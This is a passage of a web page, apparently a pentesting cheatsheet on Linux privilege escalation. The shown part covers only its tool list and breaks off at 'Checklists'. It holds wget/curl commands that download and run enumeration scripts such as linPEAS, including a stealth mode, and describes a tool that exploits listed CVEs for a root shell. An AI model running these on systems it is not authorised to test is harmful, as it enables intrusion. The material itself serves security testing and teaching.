<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Tips, tricks, techniques and methodologies for escalating privileges in a linux environment."><meta name=theme-color content="#FFFFFF"><meta name=color-scheme content="light dark"><meta property="og:title" content="Linux - Privilege Escalation"><meta property="og:description" content="Tips, tricks, techniques and methodologies for escalating privileges in a linux environment."><meta property="og:type" content="article"><meta property="og:url" content="https://www.grayhatfreelancing.com/docs/linux_privilege_escalation/"><meta property="article:section" content="docs"><meta property="article:published_time" content="2022-11-03T00:00:00+00:00"><meta property="article:modified_time" content="2023-01-27T03:10:54-05:00"><title>Linux - Privilege Escalation | Gray Hat Freelancing</title><link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png type=image/x-icon><link rel=stylesheet href=/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css integrity="sha256-SzX+0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt+5t7EDugY=" crossorigin=anonymous><script defer src=/flexsearch.min.js></script>
<script defer src=/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2+lMiccGbo=" crossorigin=anonymous></script>
<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk=" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-5VH24CV5RY"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-5VH24CV5RY",{anonymize_ip:!1})}</script><script type=text/javascript>(function(e,t,n,s,o,i,a){e[o]=e[o]||function(){(e[o].a=e[o].a||[]).push(arguments)},e[o].l=1*new Date;for(var r=0;r<document.scripts.length;r++)if(document.scripts[r].src===s)return;i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","https://mc.yandex.ru/metrika/tag.js","ym"),ym(90832071,"init",{clickmap:!0,trackLinks:!0,accurateTrackBounce:!0,webvisor:!0})</script><noscript><div><img src=https://mc.yandex.ru/watch/90832071 style=position:absolute;left:-9999px alt></div></noscript><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4012275371022894" crossorigin=anonymous></script>
<script async src="https://fundingchoicesmessages.google.com/i/pub-4012275371022894?ers=1" nonce=JP_uCP3IebkCUXDh6KjRmw></script><script nonce=JP_uCP3IebkCUXDh6KjRmw>(function(){function e(){if(!window.frames.googlefcPresent)if(document.body){const e=document.createElement("iframe");e.style="width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;",e.style.display="none",e.name="googlefcPresent",document.body.appendChild(e)}else setTimeout(e,0)}e()})()</script>
<script>(function(){"use strict";if(V=function(e){var t=0;return function(){return t<e.length?{done:!1,value:e[t++]}:{done:!0}}},P="function"==typeof Object.create?Object.create:function(e){var t=function(){};return t.prototype=e,new t},"function"==typeof Object.setPrototypeOf)g=Object.setPrototypeOf;else{a:{N={a:!0},O={};try{O.__proto__=N,k=O.a;break a}catch{}k=!1}g=k?function(e,t){if(e.__proto__=t,e.__proto__!==t)throw new TypeError(e+" is not extensible");return e}:null}var F=g,w=function(e,t){if(e.prototype=P(t.prototype),e.prototype.constructor=e,F)F(e,t);else for(n in t)if("prototype"!=n)if(Object.defineProperties){var n,s=Object.getOwnPropertyDescriptor(t,n);s&&Object.defineProperty(e,n,s)}else e[n]=t[n];e.v=t.prototype},e=this||self,Z=function(){},M=function(e){return e},m=function(e,t){this.g=t===S?e:""};m.prototype.toString=function(){return this.g+""},S={},E=function(t){if(void 0===h){var n=null,s=e.trustedTypes;if(s&&s.createPolicy){try{n=s.createPolicy("goog#html",{createHTML:M,createScript:M,createScriptURL:M})}catch(t){e.console&&e.console.error(t.message)}h=n}else h=n}return t=(n=h)?n.createScriptURL(t):t,new m(t,S)},x=function(){return Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)},C={},r=null,b="function"==typeof Uint8Array;function T(e,t,n){return"object"==typeof e?b&&!Array.isArray(e)&&e instanceof Uint8Array?n(e):D(e,t,n):t(e)}function D(e,t,n){if(Array.isArray(e)){for(var a,o=Array(e.length),s=0;s<e.length;s++)a=e[s],a!=null&&(o[s]=T(a,t,n));return Array.isArray(e)&&e.s&&i(o),o}o={};for(s in e)Object.prototype.hasOwnProperty.call(e,s)&&(a=e[s],a!=null&&(o[s]=T(a,t,n)));return o}function ee(e){return D(e,function(e){return"number"==typeof e?isFinite(e)?e:String(e):e},function(e){if(void 0===n&&(n=0),!r){r={};for(var t,n,s,o,l,d,a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),c=["+/=","+/","-_=","-_.","-_"],i=0;5>i;i++){t=a.concat(c[i].split("")),C[i]=t;for(s=0;s<t.length;s++)o=t[s],void 0===r[o]&&(r[o]=s)}}n=C[n],a=Array(Math.floor(e.length/3)),c=n[64]||"";for(i=t=0;t<e.length-2;t+=3)l=e[t],d=e[t+1],o=e[t+2],s=n[l>>2],l=n[(l&3)<<4|d>>4],d=n[(d&15)<<2|o>>6],o=n[o&63],a[i++]=""+s+l+d+o;switch(s=0,o=c,e.length-t){case 2:s=e[t+1],o=n[(s&15)<<2]||c;case 1:e=e[t],a[i]=""+n[e>>2]+n[(e&3)<<4|s>>4]+o+c}return a.join("")})}var $={s:{value:!0,configurable:!0}},i=function(e){return Array.isArray(e)&&!Object.isFrozen(e)&&Object.defineProperties(e,$),e},o=function(e,t,n){var s=p;p=null,e||(e=s),s=this.constructor.u,e||(e=s?[s]:[]),this.j=s?0:-1,this.h=null,this.g=e;a:{if(s=this.g.length,e=s-1,s&&(s=this.g[e],!(null===s||"object"!=typeof s||Array.isArray(s)||b&&s instanceof Uint8Array))){this.l=e-this.j,this.i=s;break a}void 0!==t&&-1<t?(this.l=Math.max(t,e+1-this.j),this.i=null):this.l=Number.MAX_VALUE}if(n)for(t=0;t<n.length;t++)e=n[t],e<this.l?(e+=this.j,(s=this.g[e])?i(s):this.g[e]=f):(s=this.l+this.j,this.g[s]||(this.i=this.g[s]={}),(s=this.i[e])?i(s):this.i[e]=f)},f=Object.freeze(i([])),t=function(e,t){if(-1===t)return null;if(t<e.l){t+=e.j;var n=e.g[t];return n!==f?n:e.g[t]=i([])}if(e.i)return n=e.i[t],n!==f?n:e.i[t]=i([])},z=function(e,n){var s,o=L;return-1===n?null:(e.h||(e.h={}),e.h[n]||(s=t(e,n),s&&(e.h[n]=new o(s))),e.h[n])};o.prototype.toJSON=function(){var e=l(this,!1);return ee(e)},l=function(e,t){if(e.h)for(o in e.h)if(Object.prototype.hasOwnProperty.call(e.h,o)){var s,o,n=e.h[o];if(Array.isArray(n))for(s=0;s<n.length;s++)n[s]&&l(n[s],t);else n&&l(n,t)}return e.g},j=function(e,t){return p=t=t?JSON.parse(t):null,e=new e(t),p=null,e},o.prototype.toString=function(){return l(this,!1).toString()},A=function(e){o.call(this,e)},w(A,o);function Q(e){var t,s=(e.ownerDocument&&e.ownerDocument.defaultView||window).document,n=null===(t=s.querySelector)||void 0===t?void 0:t.call(s,"script[nonce]");(t=n?n.nonce||n.getAttribute("nonce")||"":"")&&e.setAttribute("nonce",t)}u=function(e,t){return t=String(t),"application/xhtml+xml"===e.contentType&&(t=t.toLowerCase()),e.createElement(t)},d=function(t){this.g=t||e.document||document},d.prototype.appendChild=function(e,t){e.appendChild(t)};var r,l,d,u,h,p,g,b,j,y,_,O,x,C,E,k,A,S,N,P,V,v=function(e,t,n,s,o,i){try{var r=e.g,a=u(e.g,"SCRIPT");a.async=!0,a.src=t instanceof m&&t.constructor===m?t.g:"type_error:TrustedResourceUrl",Q(a),r.head.appendChild(a),a.addEventListener("load",function(){o(),s&&r.head.removeChild(a)}),a.addEventListener("error",function(){0<n?v(e,t,n-1,s,o,i):(s&&r.head.removeChild(a),i())})}catch{i()}},X=e.atob("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vaW1hZ2VzL2ljb25zL21hdGVyaWFsL3N5c3RlbS8xeC93YXJuaW5nX2FtYmVyXzI0ZHAucG5n"),K=e.atob("WW91IGFyZSBzZWVpbmcgdGhpcyBtZXNzYWdlIGJlY2F1c2UgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlIGlzIGludGVyZmVyaW5nIHdpdGggdGhpcyBwYWdlLg=="),U=e.atob("RGlzYWJsZSBhbnkgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlLCB0aGVuIHJlbG9hZCB0aGlzIHBhZ2Uu"),W=function(e,t,n){this.h=e,this.j=new d(this.h),this.g=null,this.i=[],this.l=!1,this.o=t,this.m=n},I=function(t){if(t.h.body&&!t.l){var n=function(){B(t),e.setTimeout(function(){return R(t,3)},50)};v(t.j,t.o,2,!0,function(){e[t.m]||n()},n),t.l=!0}},B=function(e){for(var i,r,c,l,t=n(1,5),o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i);t=s(e),t.style.bottom="0",t.style.left="0",t.style.position="fixed",t.style.width=n(100,110).toString()+"%",t.style.zIndex=n(2147483544,2147483644).toString(),t.style["background-color"]=H(249,259,242,252,219,229),t.style["box-shadow"]="0 0 12px #888",t.style.color=H(0,10,0,10,0,10),t.style.display="flex",t.style["justify-content"]="center",t.style["font-family"]="Roboto, Arial",o=s(e),o.style.width=n(80,85).toString()+"%",o.style.maxWidth=n(750,775).toString()+"px",o.style.margin="24px",o.style.display="flex",o.style["align-items"]="flex-start",o.style["justify-content"]="center",i=u(e.j.g,"IMG"),i.className=x(),i.src=X,i.style.height="24px",i.style.width="24px",i.style["padding-right"]="16px",r=s(e),c=s(e),c.style["font-weight"]="bold",c.textContent=K,l=s(e),l.textContent=U,a(e,r,c),a(e,r,l),a(e,o,i),a(e,o,r),a(e,t,o),e.g=t,e.h.body.appendChild(e.g),t=n(1,5);for(o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i)},a=function(e,t,o){for(var r,i=n(1,5),a=0;a<i;a++)r=s(e),t.appendChild(r);t.appendChild(o),o=n(1,5);for(i=0;i<o;i++)a=s(e),t.appendChild(a)},n=function(e,t){return Math.floor(e+Math.random()*(t-e))},H=function(e,t,s,o,i,a){return"rgb("+n(Math.max(e,0),Math.min(t,255)).toString()+","+n(Math.max(s,0),Math.min(o,255)).toString()+","+n(Math.max(i,0),Math.min(a,255)).toString()+")"},s=function(e){return e=u(e.j.g,"DIV"),e.className=x(),e},R=function(t,n){0>=n||null!=t.g&&0!=t.g.offsetHeight&&0!=t.g.offsetWidth||(q(t),B(t),e.setTimeout(function(){return R(t,n-1)},50))},q=function(e){var t=e.i,n="undefined"!=typeof Symbol&&Symbol.iterator&&t[Symbol.iterator],t=n?n.call(t):{next:V(t)};for(n=t.next();!n.done;n=t.next())(n=n.value)&&n.parentNode&&n.parentNode.removeChild(n);e.i=[],(t=e.g)&&t.parentNode&&t.parentNode.removeChild(t),e.g=null},Y=function(t,n,s,o,i){var a=G(s),c=function(s){s.appendChild(a),e.setTimeout(function(){a?(0!==a.offsetHeight&&0!==a.offsetWidth?n():t(),a.parentNode&&a.parentNode.removeChild(a)):t()},o)},r=function(t){document.body?c(document.body):0<t?e.setTimeout(function(){r(t-1)},i):n()};r(3)},G=function(e){var t=document.createElement("div");return t.className=e,t.style.width="1px",t.style.height="1px",t.style.position="absolute",t.style.left="-10000px",t.style.top="-10000px",t.style.zIndex="-10000",t},L=function(e){o.call(this,e)};w(L,o),_=function(e){o.call(this,e)},w(_,o),y=function(e,n){this.l=e,this.m=new d(e.document),this.g=n,this.i=t(this.g,1),n=z(this.g,2),this.o=E(t(n,4)||""),this.h=!1,n=z(this.g,13),n=E(t(n,4)||""),this.j=new W(e.document,n,t(this.g,12))},y.prototype.start=function(){J(this)};var J=function(n){te(n),v(n.m,n.o,3,!1,function(){a:{var i,s=n.i,o=e.btoa(s);if(o=e[o]){try{i=j(A,e.atob(o))}catch{s=!1;break a}s=s===t(i,1)}else s=!1}s?c(n,t(n.g,14)):(c(n,t(n.g,8)),I(n.j))},function(){Y(function(){c(n,t(n.g,7)),I(n.j)},function(){return c(n,t(n.g,6))},t(n.g,9),t(n.g,10),t(n.g,11))})},c=function(e,t){e.h||(e.h=!0,e=new e.l.XMLHttpRequest,e.open("GET",t,!0),e.send())},te=function(n){var s=e.btoa(n.i);n.l[s]&&c(n,t(n.g,5))};(function(t,n){e[t]=function(){for(var i=[],o=0;o<arguments.length;++o)i[o-0]=arguments[o];e[t]=Z,n.apply(null,i)}})("__h82AlnkH6D91__",function(e){"function"==typeof window.atob&&new y(window,j(_,window.atob(e))).start()})}).call(this),window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9iL3B1Yi00MDEyMjc1MzcxMDIyODk0Il0sbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9lbC9BR1NLV3hWWTQzNTA3UlV4MlBicWdSRGsxQnFnWnV6Rm5xU3hmTDZsRVcyVDRvSVhTa2QzRlZvQlpra0RHTlRvYmU1dTM5U3k4bFVROGJsNVpxQjlxWGh6Z3FuT1JBXHUwMDNkXHUwMDNkP3RlXHUwMDNkVE9LRU5fRVhQT1NFRCIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFY1V0czR01DdDNLNmVxTDlKQ2NFNnJwU0oxNDVZTjlXOS1SU2tFd3J3NXhMbEROSU1rdVVCcnI2QjJyY3Zia0w0dGNMOEFCV0ZFUy1idzBNWG8zcUdyTUFcdTAwM2RcdTAwM2Q/YWJcdTAwM2QxXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFhfdzJlbk9UVmhhN05TeVAxakR2SkJyMU1MbDhvS0Zpb0N1bm0wVWxFMEdqUGVtVUM1RFpLajFTWGxBYktHUWZWa1lvNWs0RlIzbXdvdktROVA2cWE4cmdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QyXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFdNTi1PNHpRLUJENU1wakZVNWVjUVdqeGIwNHh5Yzc3akdlOEdwbjZ5VWtiemF3SkxYV3lfQ2xMWWFORVEtWER0cXJ4R1JQMzBpbjNBUnJZTXR2NHlXMWdcdTAwM2RcdTAwM2Q/c2JmXHUwMDNkMiIsImRpdi1ncHQtYWQiLDIwLDEwMCwiY0hWaUxUUXdNVEl5TnpVek56RXdNakk0T1RRXHUwMDNkIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vd3d3LmdzdGF0aWMuY29tLzBlbW4vZi9wL3B1Yi00MDEyMjc1MzcxMDIyODk0LmpzP3VzcXBcdTAwM2RDQVEiXSwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vZWwvQUdTS1d4VnlVcTVpZThXX0JkWFlGNXo3MzhtQjBkMEcxeEFlZ1BPZHp3WGVDdFdvQW5xVVNvWndVdW00UFhMRXNpUEZ1b2oxUUFUN25WNl9XWDdjMEE1X3VacFd2UVx1MDAzZFx1MDAzZCJd")</script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/logo.png alt=Logo><span>Gray Hat Freelancing</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><a href=/docs/kuburnetes/>Kuburnetes</a></li><li><a href=/docs/checking_for_account_takeover/>Account Takeovers</a></li><li><a href=/docs/attacking_active_directory/>Active Directory Attacks</a></li><li><a href=/docs/amazon_aws_s3_buckets/>Amazon AWS S3 Buckets</a></li><li><a href=/docs/api_key_leaks/>API Key Leaks</a></li><li><a href=/docs/argument_injection/>Argument Injection</a></li><li><a href=/docs/command_injection/>Command Injection</a></li><li><a href=/docs/cors_misconfigurations/>CORS Misconfigurations</a></li><li><a href=/docs/csrf_injection/>CSRF Injection</a></li><li><a href=/docs/directory_traversal/>Directory Traversal</a></li><li><a href=/docs/network_discovery/>Network Discovery</a></li><li><a href=/docs/insecure_deserialization/python/>Python Deserialization</a></li><li><a href=/docs/insecure_deserialization/ruby/>Ruby Deserialization</a></li><li><a href=/docs/web_sockets/>Web Sockets Attacks</a></li><li><a href=/docs/insecure_deserialization/yaml/>YAML Deserialization</a></li><li><a href=/docs/insecure_deserialization/dotnet/>.NET Insecure Deserialization</a></li><li><a href=/docs/exercism_solutions/>Exercism Solutions</a></li><li><a href=/docs/insecure_deserialization/>Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/node/>Node Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/php/>PHP Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/java/>Insecure Deserialization - Java</a></li><li><a href=/docs/cobalt_strike_all_you_need/>Cobalt Strike</a></li><li><a href=/docs/brute_force_cracking/>Brute Force Cracking</a></li><li><a href=/docs/training_grounds/>Training Grounds</a></li><li><a href=/docs/wordpress/>Wordpress Security</a></li><li><a href=/docs/windows_hardening/>Windows - Hardening</a></li><li><a href=/docs/windows_amsi_bypass/>Bypassing AMSI protections</a></li><li><a href=/docs/subdomains_enumeration/>Enumerating Subdomains</a></li><li><a href=/docs/windows_mimikatz/>Windows - Mimikatz</a></li><li><a href=/docs/windows_persistence/>Windows - Persistence</a></li><li><a href=/docs/windows_privilege_escalation/>Windows - Privilege Escalation</a></li><li><a href=/docs/windows_using_credentials/>Windows - Using Credentials</a></li><li><a href=/docs/windows_download_and_execute/>Windows Download and Execute Methods</a></li><li><a href=/docs/escape_breakout/>Application Escape and Breakout</a></li><li><a href=/docs/office_attacks/>Attacking Office</a></li><li><a href=/docs/bind_shell_cheatsheet/>Bind Shell Cheatsheet</a></li><li><a href=/docs/methodology_and_enumeration/>Bug Hunting Methodology and Enumeration</a></li><li><a href=/docs/hash_cracking/>Hash Cracking Cheatsheet</a></li><li><a href=/docs/linux_persistence/>Linux - Persistence</a></li><li><a href=/docs/linux_privilege_escalation/ class=active>Linux - Privilege Escalation</a></li><li><a href=/docs/metasploit_cheatsheet/>Metasploit</a></li><li><a href=/docs/windows_dpapi/>Microsoft Window's Data Protection API</a></li><li><a href=/docs/microsoft_azure_cloud/>Microsoft's Azure Cloud</a></li><li><a href=/docs/network_pivoting_techniques/>Network Pivoting Cheatsheet</a></li><li><a href=/docs/mssql_server_cheatsheet/>Pentesting MSSQL Server Cheatsheet</a></li><li><a href=/docs/powershell_cheatsheet/>Powershell Cheatsheet</a></li><li><a href=/docs/reverse_shell_cheatsheet/>Reverse Shell Cheatsheet</a></li><li><a href=/docs/source_code_management/>Source Code Management</a></li><li><a href=/docs/docker_pentesting/>Docker Security</a></li><li><a href=/docs/miscellaneous_tricks/>Miscellaneous Tips and Tricks</a></li><li><a href=/docs/csv_injection/>Csv Injection</a></li><li><a href=/docs/crlf_injection/>CRLF Injection</a></li><li><a href=/docs/cve_exploits/>CVE Exploits</a></li><li><a href=/docs/dependency_confusion_attacks/>Dependency Confusion</a></li><li><a href=/docs/dns_rebinding/>DNS Rebinding</a></li><li><a href=/docs/file_inclusion/>File Inclusion</a></li><li><a href=/docs/http_parameter_pollution/>HTTP Parameter Pollution</a></li><li><a href=/docs/insecure_direct_object_references/>Insecure Direct Object References</a></li><li><a href=/docs/insecure_file_uploads/>Insecure File Upload</a></li><li><a href=/docs/insecure_management_interfaces/>Insecure Management Interface</a></li><li><a href=/docs/insecure_source_code_management/>Insecure Source Code Management</a></li><li><a href=/docs/java_rmi/>Java RMI</a></li><li><a href=/docs/json_web_token/>JSON Web Tokens</a></li><li><a href=/docs/latex_injection/>LaTeX Injection</a></li><li><a href=/docs/ldap_injection/>LDAP Injection</a></li><li><a href=/docs/nosql_injection/>NoSQL Injection</a></li><li><a href=/docs/oauth/>OAuth</a></li><li><a href=/docs/open_url_redirection/>Open URL Redirection</a></li><li><a href=/docs/race_conditions/>Race Conditions</a></li><li><a href=/docs/request_smuggling/>Request Smuggling</a></li><li><a href=/docs/saml_injection/>SAML Injection</a></li><li><a href=/docs/server_side_request_forgery/>Server-Side Request Forgery</a></li><li><a href=/docs/server_side_template_injection/>Server-Side Template Injection</a></li><li><a href=/docs/sql_injection/>SQL Injection</a></li><li><a href=/docs/tabnabbing/>Tabnabbing</a></li><li><a href=/docs/type_juggling/>Type Juggling</a></li><li><a href=/docs/web_cache_deception/>Web Cache Deception</a></li><li><a href=/docs/xxe_injection/>XML eXternal Entity Injection</a></li><li><a href=/docs/xpath_injection/>XPATH Injection</a></li><li><a href=/docs/xslt_injection/>XSLT Injection</a></li><li><a href=/docs/xss_injection/>XSS Injection</a></li><li><a href=/docs/graphql_injection/>GraphQL Injection</a></li></ul><ul><li><a href=/posts/>Blog</a></li><li><a href=https://github.com/m00tiny/ target=_blank rel=noopener>Github</a></li><li><a href=https://github.com/m00tiny/grayhatfreelancing target=_blank rel=noopener>Contribute</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label>
<strong>Linux - Privilege Escalation</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#linux---privilege-escalation>Linux - Privilege Escalation</a><ul><li><a href=#tools>Tools</a></li><li><a href=#checklists>Checklists</a></li><li><a href=#looting-for-passwords>Looting for passwords</a><ul><li><a href=#files-containing-passwords>Files containing passwords</a></li><li><a href=#old-passwords-in-etcsecurityopasswd>Old passwords in /etc/security/opasswd</a></li><li><a href=#last-edited-files>Last edited files</a></li><li><a href=#in-memory-passwords>In memory passwords</a></li><li><a href=#find-sensitive-files>Find sensitive files</a></li></ul></li><li><a href=#ssh-key>SSH Key</a><ul><li><a href=#sensitive-files>Sensitive files</a></li><li><a href=#ssh-key-predictable-prng-authorized_keys-process>SSH Key Predictable PRNG (Authorized_Keys) Process</a></li></ul></li><li><a href=#scheduled-tasks>Scheduled tasks</a><ul><li><a href=#cron-jobs>Cron jobs</a></li></ul></li><li><a href=#systemd-timers>Systemd timers</a></li><li><a href=#suid>SUID</a><ul><li><a href=#find-suid-binaries>Find SUID binaries</a></li><li><a href=#create-a-suid-binary>Create a SUID binary</a></li></ul></li><li><a href=#capabilities>Capabilities</a><ul><li><a href=#list-capabilities-of-binaries>List capabilities of binaries</a></li><li><a href=#edit-capabilities>Edit capabilities</a></li><li><a href=#interesting-capabilities>Interesting capabilities</a></li></ul></li><li><a href=#sudo>SUDO</a><ul><li><a href=#nopasswd>NOPASSWD</a></li><li><a href=#ld_preload-and-nopasswd>LD_PRELOAD and NOPASSWD</a></li><li><a href=#doas>Doas</a></li><li><a href=#sudo_inject>sudo_inject</a></li><li><a href=#cve-2019-14287>CVE-2019-14287</a></li></ul></li><li><a href=#gtfobins>GTFOBins</a></li><li><a href=#wildcard>Wildcard</a></li><li><a href=#writable-files>Writable files</a><ul><li><a href=#writable-etcsysconfignetwork-scripts-centosredhat>Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)</a></li><li><a href=#writable-etcpasswd>Writable /etc/passwd</a></li><li><a href=#writable-etcsudoers>Writable /etc/sudoers</a></li></ul></li><li><a href=#nfs-root-squashing>NFS Root Squashing</a></li><li><a href=#shared-library>Shared Library</a><ul><li><a href=#ldconfig>ldconfig</a></li><li><a href=#rpath>RPATH</a></li></ul></li><li><a href=#groups>Groups</a><ul><li><a href=#docker>Docker</a></li><li><a href=#lxclxd>LXC/LXD</a></li></ul></li><li><a href=#hijack-tmux-session>Hijack TMUX session</a></li><li><a href=#kernel-exploits>Kernel Exploits</a><ul><li><a href=#cve-2022-0847-dirtypipe>CVE-2022-0847 (DirtyPipe)</a></li><li><a href=#cve-2016-5195-dirtycow>CVE-2016-5195 (DirtyCow)</a></li><li><a href=#cve-2010-3904-rds>CVE-2010-3904 (RDS)</a></li><li><a href=#cve-2010-4258-full-nelson>CVE-2010-4258 (Full Nelson)</a></li><li><a href=#cve-2012-0056-mempodipper>CVE-2012-0056 (Mempodipper)</a></li></ul></li><li><a href=#references>References</a></li></ul></li></ul></nav></aside></header><article class=markdown><h1 id=linux---privilege-escalation>Linux - Privilege Escalation
<a class=anchor href=#linux---privilege-escalation>#</a></h1><h2 id=tools>Tools
<a class=anchor href=#tools>#</a></h2><p>There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors.
Here are a few:</p><ul><li><p><a href=https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS>LinPEAS - Linux Privilege Escalation Awesome Script</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wget <span style=color:#e6db74>&#34;https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&#34;</span> -O linpeas.sh
</span></span><span style=display:flex><span>curl <span style=color:#e6db74>&#34;https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&#34;</span> -o linpeas.sh
</span></span><span style=display:flex><span>./linpeas.sh -a <span style=color:#75715e>#all checks - deeper system enumeration, but it takes longer to complete.</span>
</span></span><span style=display:flex><span>./linpeas.sh -s <span style=color:#75715e>#superfast &amp; stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.</span>
</span></span><span style=display:flex><span>./linpeas.sh -P <span style=color:#75715e>#Password - Pass a password that will be used with sudo -l and bruteforcing other users</span>
</span></span></code></pre></div></li><li><p><a href=https://github.com/liamg/traitor>Traitor - Linux Privielege Escalation</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Automatically exploit low-hanging fruit to pop a root shell. Linux privilege escalation made easy! Traitor packages up a bunch of methods to exploit local misconfigurations and vulnerabilities in order to pop a root shell:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nearly all of GTFOBins
</span></span><span style=display:flex><span>Writeable docker.sock
</span></span><span style=display:flex><span>CVE-2022-0847 <span style=color:#f92672>(</span>Dirty pipe<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>CVE-2021-4034 <span style=color:#f92672>(</span>pwnkit<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>CVE-2021-3560
</span></span></code></pre></div></li><li><p><a href=https://github.com/diego-treitos/linux-smart-enumeration>LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>wget <span style=color:#e6db74>&#34;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh&#34;</span> -O lse.sh
</span></span><span style=display:flex><span>curl <span style=color:#e6db74>&#34;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh&#34;</span> -o lse.sh
</span></span><span style=display:flex><span>./lse.sh -l1 <span style=color:#75715e># shows interesting information that should help you to privesc</span>
</span></span><span style=display:flex><span>./lse.sh -l2 <span style=color:#75715e># dump all the information it gathers about the system</span>
</span></span></code></pre></div></li><li><p><a href=https://github.com/rebootuser/LinEnum>LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
</span></span></code></pre></div></li><li><p><a href=https://github.com/AlessandroZ/BeRoot>BeRoot - Privilege Escalation Project - Windows / Linux / Mac</a></p></li><li><p><a href=https://github.com/sleventyeleven/linuxprivchecker>linuxprivchecker.py - a Linux Privilege Escalation Check Script</a></p></li><li><p><a href=https://github.com/pentestmonkey/unix-privesc-check>unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check</a></p></li><li><p><a href=https://github.com/TH3xACE/SUDO_KILLER>Privilege Escalation through sudo - Linux</a></p></li></ul><h2 id=checklists>Checklists
